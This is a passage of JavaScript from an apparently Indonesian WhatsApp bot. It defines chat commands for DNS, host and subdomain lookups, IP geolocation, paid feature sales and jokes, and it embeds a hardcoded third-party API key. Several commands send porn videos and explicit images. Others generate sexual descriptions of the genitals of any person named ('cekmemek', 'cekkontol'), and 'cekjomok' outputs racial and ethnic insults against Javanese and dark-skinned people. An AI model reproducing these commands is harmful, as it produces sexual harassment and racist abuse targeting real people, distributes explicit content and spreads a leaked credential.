        // Mendapatkan target dari input pengguna
        const input = m.text.split(" ")[1]; // Memisahkan perintah dan target
        const target = input ? input.trim() : null;

        // Validasi jika target kosong atau tidak diberikan
        if (!target) {
            reply("Mohon masukkan nama domain/subdomain yang ingin diperiksa, contohnya: `.cekdns dpr.go.id`");
            break;
        }

        // Memeriksa subdomain menggunakan endpoint API
        const result = await axios.get(`https://networkcalc.com/api/dns/lookup/${target}`);
        const data = result.data;

        // Memastikan respons memiliki format valid
        if (data && data.status === "OK" && data.records) {
            const { hostname, records } = data;

            // Menyusun pesan hasil
            let replyMessage = `*DNS Lookup Result for: ${hostname}*\n\n`;

            // Memproses record A
            if (records.A.length > 0) {
                replyMessage += "*A Records:*\n";
                records.A.forEach(record => {
                    replyMessage += `  - Address: ${record.address}\n    TTL: ${record.ttl}\n`;
                });
            } else {
                replyMessage += "*A Records:*\n  - Tidak ditemukan\n";
            }

            // Memproses record CNAME
            if (records.CNAME.length > 0) {
                replyMessage += "\n*CNAME Records:*\n";
                records.CNAME.forEach(record => {
                    replyMessage += `  - ${record}\n`;
                });
            } else {
                replyMessage += "\n*CNAME Records:*\n  - Tidak ditemukan\n";
            }

            // Menambahkan catatan jika jenis lainnya kosong
            const otherTypes = ["MX", "NS", "SOA", "TXT"];
            otherTypes.forEach(type => {
                if (records[type] && records[type].length > 0) {
                    replyMessage += `\n*${type} Records:*\n`;
                    records[type].forEach(record => {
                        replyMessage += `  - ${JSON.stringify(record)}\n`;
                    });
                } else {
                    replyMessage += `\n*${type} Records:*\n  - Tidak ditemukan\n`;
                }
            });

            // Mengirimkan hasil kepada pengguna
            reply(replyMessage.trim());
        } else {
            reply("Data DNS tidak valid atau tidak dapat diambil.");
        }
    } catch (error) {
        console.error(error);
        reply("Terjadi kesalahan saat memeriksa subdomain.");
    }
}
break;

case "cekdomain":
case "cekhost": {
 if (!args[0]) return reply('Masukkan host yang ingin dicek!\nContoh: *cekhost google.com*');
 let host = args[0];
 let apiUrl = `https://fastrestapis.fasturl.cloud/tool/checkhost?host=${host}&mode=http`;
 try {
 let response = await fetch(apiUrl);
 let data = await response.json();
 if (data.status !== 200 || !data.result) {
 return reply('Gagal mengambil data. Pastikan host yang dimasukkan benar.');
 }
 let resultText = `🔍 Hasil Pengecekan Host: *${data.result.host}*\n\n`;
 for (let node in data.result.result) {
 let entry = data.result.result[node];
 if (!entry) continue;
 let { country_name, flag_emoji } = entry;
 let responseTime = entry[0][1].toFixed(3);
 let status = entry[0][2];
 let ip = entry[0][4];
 resultText += `${flag_emoji} *${country_name}*\n`;
 resultText += `⏱️ Waktu Respons: ${responseTime} detik\n`;
 resultText += `📡 Status: ${status}\n`;
 resultText += `🌐 IP: ${ip}\n\n`;
 }
 reply(resultText);
 } catch (e) {
 console.error(e);
 reply('Terjadi kesalahan saat mengambil data.');
 }
}
 break
			
			case 'cekweb': {
			if (!isCreator) return reply(mess.owner)
				if (!text) return reply(`*Masukan Domain Web!*\n\nContoh :\n${prefix+command} google.com`)
				if (budy.match(`/|https|http|:`)) return reply(`*Masukan Domain Saja!*\n\nContoh:\n${prefix+command} google.com`)
				await client.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})

				axios.get(`https://api.hackertarget.com/pagelinks/?q=${text}`)
					.then(async response => {
						const pageLinks = response.data;

						const dnsResponse = await axios.get(`https://api.hackertarget.com/dnslookup/?q=${text}`);
						const dnsData = dnsResponse.data;

						const headerResponse = await axios.get(`https://api.hackertarget.com/httpheaders/?q=${text}`);
						const headerData = headerResponse.data;

						const serverResponse = await axios.get(`https://api.hackertarget.com/httpheaders/?q=${text}`);
						const serverData = serverResponse.data;

						let info = `*乂 DOMAIN CHECK*
            
*Extract Links*: 
${pageLinks.split("\n").map(link => `• ${link}`).join("\n")}

*DNS Recod*:
${dnsData}

*Headers Data*:
${headerData}

*Server Respon*:
${serverData}`;

						reply(info);
					})
					.catch(error => {
						console.error("Error fetching website info:", error);
						reply("Terjadi kesalahan saat mengambil informasi dari website yang dituju.");
					});
			}
			break
		
			
			case 'ngl':
			case 'sendngl': {
				if (!text) return reply(`*Masukan Input Query!*\n\nContoh:\n${prefix+command} https://ngl.link/danny hallo`)
				if (!budy.match('https://ngl.link/')) return reply(`Contoh:\n${prefix+command} https://ngl.link/danny hallo`)
				let [usersi, ...message] = text.split(' ');
				let userr = usersi.split('https://ngl.link/')[1]
				message = message.join(' ');
				try {
					let ngl = await axios.post("https://ngl.link/api/submit",
						`username=${userr}&question=${message}&deviceId=18d7b980-ac6a-4878-906e-087dfec6ea1b&gameSlug=&referrer=`
					);
					reply(`*Pesan terkirim 🤓*

ID : ${ngl.data.questionId}
Region : ${ngl.data.userRegion}
`)
				} catch (error) {
        console.error("Error Send NgL:", error.message);
				}
			}
			break
			
		case "ceksubdo": {
    try {
        // Mendapatkan target dari input pengguna
        const input = m.text.split(" ")[1]; // Memisahkan perintah dan target
        const target = input ? input.trim() : null;

        // Validasi jika target kosong atau tidak diberikan
        if (!target) {
            reply("Mohon masukkan nama domain yang ingin diperiksa, contohnya: `.ceksubdo serverdev.com`");
            break;
        }

        // Memeriksa subdomain menggunakan endpoint API WhoisXML
        const apiKey = "at_3OXsNYCCbeDeSwXkgiPhJWeTTKAzR"; // Ganti dengan API key Anda
        const result = await axios.get(`https://subdomains.whoisxmlapi.com/api/v1?apiKey=${apiKey}&domainName=${target}`);
        const data = result.data;

        // Memastikan data subdomain ada dan valid
        if (data && data.result && data.result.records && data.result.records.length > 0) {
            const subdomains = data.result.records;
            const count = data.result.count; // Total jumlah subdomain ditemukan

            // Menyusun pesan hasil
            let replyMessage = `*Subdomain Lookup Result for: ${target}*\nJumlah Subdomain: ${count}\n\n`;

            subdomains.forEach((subdomain, index) => {
                const firstSeen = new Date(subdomain.firstSeen * 1000).toLocaleString();
                const lastSeen = new Date(subdomain.lastSeen * 1000).toLocaleString();
                replyMessage += `${index + 1}. ${subdomain.domain}\n  - First Seen: ${firstSeen}\n  - Last Seen: ${lastSeen}\n`;
            });

            // Mengirimkan hasil kepada pengguna
            reply(replyMessage.trim());
        } else {
            reply(`Tidak ditemukan subdomain untuk target: ${target}`);
        }
    } catch (error) {
        console.error(error);
        reply("Terjadi kesalahan saat memeriksa subdomain.");
    }
}
break;

case "ceksubdo2": {
      try {
        // Mendapatkan target dari input pengguna
        const input = m.text.split(" ")[1]; // Memisahkan perintah dan target
        const target = input ? input.trim() : null;

        // Validasi jika target kosong atau tidak diberikan
        if (!target) {
            return reply("⚠️ Mohon masukkan nama domain yang ingin diperiksa.\n\n📌 Contoh: `.ceksubdo server.go.id`");
        }

        // Memeriksa subdomain menggunakan API HackerTarget
        const response = await axios.get(`https://api.hackertarget.com/hostsearch/?q=${target}`);
        const data = response.data;

        // Validasi hasil response
        if (!data || data.includes("error")) {
            return reply(`❌ Tidak ditemukan subdomain untuk target: *${target}*`);
        }

        // Memproses hasil menjadi daftar yang rapi
        const lines = data.split("\n");
        let replyMessage = `🌐 *Subdomain Finder by Danny S8X-Dev*\n🔍 Target: *${target}*\n📌 Jumlah Subdomain: *${lines.length}*\n\n`;

        lines.forEach((line, index) => {
            const [subdomain, ip] = line.split(",");
            replyMessage += `⚡ ${index + 1}. *${subdomain}*\n   ┗ 📌 IP: *${ip}*\n`;
        });

        // Mengirimkan hasil kepada pengguna
        reply(replyMessage.trim());

    } catch (error) {
        console.error(error);
        reply("⚠️ Terjadi kesalahan saat memeriksa subdomain.");
    }
}
break;

case "buyfitur": {
    if (!text) return reply(example("allmenu"));

    // Daftar harga untuk setiap case
    const casePrices = {
        "allmenu": 5000,
        "jasahbpanel": 10000,
        "buyadp": 10000,
        "addscript": 5000,
        "cekweb": 5000,
        "buystoksc": 5000
    };

    // 🏷️ Ambil harga case berdasarkan input
    const caseName = text.trim(); // Nama case dari input pengguna
    const hargasc = casePrices[caseName];
    const amount = Number(hargasc) + generateRandomNumber(110, 250);
    if (!amount) {
        return reply(
            `*Case "${caseName}"* tidak ditemukan\n\n` +
            `Pastikan nama case benar atau pilih dari daftar berikut:\n` +
            Object.keys(casePrices).map((key) => `- ${key}: Rp${casePrices[key]}`).join("\n")
        );
    }

    const UrlQr = global.qrisOrderKuota;

    const initiatePayment = async () => {
        try {
            const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)

            const teksPembayaran = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Fitur Script Bot
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`;

            let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Fitur`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})

            db.users[m.sender].status_deposit = true;
            db.users[m.sender].deposit = {
                msg: msgQr,
                chat: m.sender,
                idDeposit: get.data.result.transactionId,
                amount: get.data.result.amount.toString(),
                exp: function () {
                    setTimeout(async () => {
                        if (db.users[m.sender].status_deposit) {
                            await client.sendMessage(
                                db.users[m.sender].deposit.chat,
                                { text: "⚠️ *QRIS pembayaran telah expired!*" },
                                { quoted: db.users[m.sender].deposit.msg }
                            );
                            await client.sendMessage(
                                db.users[m.sender].deposit.chat,
                                { delete: db.users[m.sender].deposit.msg.key }
                            );
                            db.users[m.sender].status_deposit = false;
                            delete db.users[m.sender].deposit;
                        }
                    }, 300000);
                }
            };

            await db.users[m.sender].deposit.exp();

            while (db.users[m.sender].status_deposit) {
                await sleep(8000);
                const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
                const req = await resultcek.data.amount;
                if (req == db.users[m.sender].deposit.amount) {
                    db.users[m.sender].status_deposit = false;

                    // ✅ Konfirmasi pembayaran berhasil
                    const getcase = (cases) => {
                        try {
                            const fileContent = fs.readFileSync('./system/DannyS8X.js').toString();
                            const regex = new RegExp(`case\\s+["']${cases}["']([\\s\\S]*?)(?=case\\s+["']|default:|\\Z)`, 'g');
                            const match = regex.exec(fileContent);

                            if (match) {
                                return "*Isi Case*: \n" + "```" + "case " + `"${cases}"` + match[1] + "```";
                            } else {
                                return null;
                            }
                        } catch (err) {
                            return null;
                        }
                    };

                    try {
                        const result = getcase(caseName);
                        if (result) {
                            reply(
                                `*Pembayaran berhasil!* Anda sekarang memiliki akses ke case *${caseName}*.\n\n${result}`
                            );
                        } else {
                            reply(`❌ *Case "${caseName}"* tidak ditemukan di sistem.`);
                        }
                    } catch (e) {
                        reply(`⚠️ *Error*: ${e.message}`);
                    }

                    delete db.users[m.sender].deposit;
                    return true;
                }
            }
        } catch (e) {
            return false;
        }
    };

    const paymentSuccess = await initiatePayment();

    if (!paymentSuccess) {
        return reply("❌ *Gagal memproses pembayaran.* Silakan coba lagi nanti.");
    }
}
break;

case 'tagsw': {
    // Validasi role
if (!isCreator) return reply(mess.owner)

    // Format input: <caption>,<id_grup>
    // Jika id_grup tidak disertakan, gunakan grup tempat perintah dikirim
    if (!text) return reply("Format salah!\nContoh: .tagsw caption nya, 120363025090404508@g.us");

    let [cap, idgc] = text.split(',');
    cap = cap ? cap.trim() : "";
    idgc = idgc ? idgc.trim() : m.chat;

    let media = null;
    let options = {};
    const jids = [m.sender, m.chat];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";

        // Jika reply media
        if (mime.includes('image')) {
            media = await m.quoted.download();
            options = {
                image: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('video')) {
            media = await m.quoted.download();
            options = {
                video: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('audio')) {
            media = await m.quoted.download();
            options = {
                audio: media,
                mimetype: 'audio/mp4',
                ptt: true, // Ubah ke true jika ingin jadi voice note
            };
        } else {
            // Jika bukan image/video/audio, kirim teks
            options = {
                text: cap || m.quoted.text || '',
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text: cap,
        };
    }

    try {
        // Ambil daftar member grup
        const groupMeta = await client.groupMetadata(idgc);
        const participants = groupMeta.participants.map(a => a.id);

        // Kirim ke status@broadcast dengan mention semua member
        return client.sendMessage("status@broadcast", options, {
            backgroundColor: "#7ACAA7",
            textArgb: 0xffffffff,
            font: 1,
            statusJidList: participants,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map(() => ({
                                tag: "to",
                                attrs: { jid: idgc },
                                content: undefined,
                            })),
                        },
                    ],
                },
            ],
        });
    } catch (err) {
        console.error("Error tagsw:", err);
        return reply("❌ Terjadi kesalahan saat mengirim status.");
    }
}
break

case "videy":
case "videyvid": {
  if (!text) return reply(example("link nya"))
  let anu = `https://vapis.my.id/api/videy?url=${encodeURIComponent(text)}`;
  const res = await fetch(anu);
  const response = await res.json();
  try {
    client.sendMessage(m.chat, {
      video: { url: response.data },
      mimeType: 'video/mp4',
      caption: 'Succes.'
    }, { quoted: loli }) //Ganti Ke m aja :v
  } catch (e) {
    console.log(e);
    reply('Gagal Ngentot :v')
  }
}
break

case 'gcsider':
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (m.isGroup) { GcSiderUpdate(m.sender,m.chat) }
const sevenDaysAgo = timestamp - (7 * 24 * 60 * 60 * 1000);
const filteredData = db_sider[m.chat].filter(item => item.timestamp >= sevenDaysAgo);
const newDataSider = groupMetadata.participants.filter(item2 => !filteredData.some(item1 => item1.user_id === item2.id));

let arr_membersider = ''
for (let mem of newDataSider) {
arr_membersider += `⭔ @${mem.id.split('@')[0]} _Sider_\n`
}

let mem_sider       = newDataSider.length
let total_memgc     = groupMetadata.size
let teks_gcsider    = `_*${mem_sider} Dari ${total_memgc}* Anggota Grup ${groupMetadata.subject} Adalah Sider_

_*Dengan Alasan :*_
➊ _Tidak Aktif Selama lebih 7 hari_
➋ _Join Tapi Tidak Pernah Nimbrung_

_Harap Aktif Di Grup Karena Akan Ada Pembersihan Member Setiap Saat_


_*List Member Sider*_
${arr_membersider}
`

client.sendMessage(m.chat, { text: teks_gcsider, mentions: newDataSider.map(a => a.id) }, { quoted:loli })


break



case 'trackip':
{
if (!text) return reply(`*Example :* ${prefix+command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await client.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
reply(formatIPInfo(res)); 
} catch (e) { 
reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break

case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator) return reply(mess.owner)
if (!args.join(" ")) return reply(example("nama group nya"))
try {
let cret = await client.groupCreate(args.join(" "), [])
let response = await client.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("sukses!")
}
}
break

case 'pornhub':
if (!text) return reply(example("input link"))
try {
let res = await searchVideo(text)
let teks = res.map((item, index) => {
    return `*[ RESULT ${index + 1} ]*
*Link :* ${item.link}
*Title :* ${item.title}
*Uploader :* ${item.uploader}
*Views :* ${item.views}
*Duration :* ${item.duration}
`
}).filter(v => v).join("\n")
await reply(teks)
} catch (e) {
await reply(eror)
}
break

case 'bokep': case 'hentaivid2': {
reply(mess.wait)
let sbe = await hentaivid()
let cejd = sbe[Math.floor(Math.random(), sbe.length)]
client.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: loli })
}
break

case 'paptt1': {
teks28 = `cabul njir 💦`
client.sendMessage(from, { image: { url: "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg" }, caption: teks28 }, { quoted: loli })
}
break
case 'paptt2': {
teks28 = `cabul njir 💦`
client.sendMessage(from, { image: { url: "https://telegra.ph/file/0e5be819fa70516f63766.jpg" }, caption: teks28 }, { quoted: loli })
}
break

case 'cekmemek': {
if (!text) return reply(example("nama orangnya"))
reply(`
╭━━━━°「 *Memek ${text}* 」°
┃
┊• Nama : ${text}
┃• memek : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• lubang : ${pickRandom(['perawan','ga perawan','udah pernah dimasukin','masih rapet','tembem'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break
case 'cekkontol': {
if (!text) return reply(example("nama orangnya"))
reply(`
╭━━━━°「 *Komtol ${text}* 」°
┃
┊• Nama : ${text}
┃• komtol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• ukuran : ${pickRandom(['5cm','10cm','7cm','9cm','15cm','100cm'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break

case 'tambah':{
if (!text) return reply(example("20+2"))
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!text) return reply(example("20-10"))
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!text) return reply(example("10*20"))
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!text) return reply(example("20/2"))
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one / nilai_two}`)}
break

case 'cekjomok': {
if (!m.isGroup) return reply(mess.group)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Azril`)
const gans = ['10% hitam','2% jawa','hitam banget😂','jomok anjir, jangan di temenin','wah wah sang makhluk hitam datang','buset jawir 😂','orang suci 🧘🏾‍♂️','jawa njir 👉🏽💩👈🏽','sang raja hitam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break

case 'cantikcek': case 'cekcantik': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(example("Putri Padang"))
const can = ['10%, banyak" perawatan ya kak:v\nCanda Perawatan:v','30%, Semangat Kaka Merawat Dirinya><','20%, Semangat Ya Kaka👍','40% Wahh Kaka><','50%, kaka cantik deh><','60%, Hai Cantik🐊','70%, Hai Ukhty🐊','62%, Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97%, Assalamualaikum Ukhty🐊','100%, Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94%, Hai Cantik><','75%, Hai Kakak Cantik','82%, wihh Kakak Pasti Sering Perawatan kan??','41%, Semangat:)','39%, Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(example("msbreewc"))
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(example("beli iphone"))
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break

case 'gantengcek': case 'cekganteng': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(example("Danny S8X"))
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62%, Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break

case 'cekkhodam': {
if (!text) return reply(example("Danny S8X"))
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	reply(response)
  }
break

case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
